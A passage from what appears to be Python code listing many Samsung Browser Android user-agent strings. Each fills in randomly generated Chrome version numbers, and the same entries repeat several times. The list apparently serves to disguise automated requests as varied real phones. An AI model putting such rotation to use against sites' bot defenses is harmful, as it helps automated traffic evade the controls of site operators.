SAMSUNG SM-G975U1) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-A307G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-A217F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-N970F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-A525F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-M315F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-A326B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.2 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G970U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-S901U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-N986B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-A515F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-F926U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G996B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G996N) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-S906N) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-A102W) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-A716U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 10; SAMSUNG SM-A505F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-S906U1) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-J737T1) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/17.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-F711U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G781V) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-A505FN) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G973U1) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 7.1.1; SAMSUNG SM-T550) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; 2107113SG) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-F916U1) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G975U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G990B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G9730) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/17.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G973U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G998W) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 10; SAMSUNG SM-G965U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G998U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G781U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-G965U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-A136U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-S908U1) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-A225M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-S326DL) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-A326U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 8.0.0; PRA-LX1) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/14.2 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G986B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G525F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G770F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G975U1) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-A307G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-A217F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-N970F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-A525F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-M315F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-A326B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.2 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G970U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-S901U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-N986B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-A515F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-F926U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G996B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G996N) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-S906N) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-A102W) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-A716U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 10; SAMSUNG SM-A505F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-S906U1) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-J737T1) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/17.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-F711U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G781V) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-A505FN) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G973U1) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 7.1.1; SAMSUNG SM-T550) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; 2107113SG) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-F916U1) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G975U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G990B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G9730) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/17.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G973U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G998W) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 10; SAMSUNG SM-G965U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G998U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G781U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-G965U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-A136U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-S908U1) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-A225M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-S326DL) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-A326U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 8.0.0; PRA-LX1) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/14.2 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G986B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G525F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G770F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G975U1) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-A307G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-A217F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-N970F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-A525F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-M315F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-A326B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.2 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G970U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 